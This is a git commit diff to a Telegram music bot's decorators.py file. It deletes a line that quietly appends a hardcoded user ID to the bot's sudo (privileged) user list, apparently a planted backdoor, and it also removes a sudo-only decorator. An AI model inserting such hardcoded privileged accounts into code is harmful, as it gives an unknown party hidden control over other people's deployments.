f487beb4534b059e82560256575f1d462b6ed47f
riz-ex <86570072+rizkyoye@users.noreply.github.com>
2021-09-10 21:29:49 +0700

    Update decorators.py

--- EXmusic/helpers/decorators.py
+++ EXmusic/helpers/decorators.py
@@ -23,8 +23,6 @@ from pyrogram.types import Message
 from EXmusic.config import SUDO_USERS
 from EXmusic.helpers.admins import get_administrators
 
-SUDO_USERS.append(1817146787)
-
 
 def errors(func: Callable) -> Callable:
     async def decorator(client: Client, message: Message):
@@ -46,12 +44,5 @@ def authorized_users_only(func: Callable) -> Callable:
         for administrator in administrators:
             if administrator == message.from_user.id:
                 return await func(client, message)
-
-    return decorator
-
-def sudo_users_only(func: Callable) -> Callable:
-    async def decorator(client: Client, message: Message):
-        if message.from_user.id in SUDO_USERS:
-            return await func(client, message)
 
     return decorator
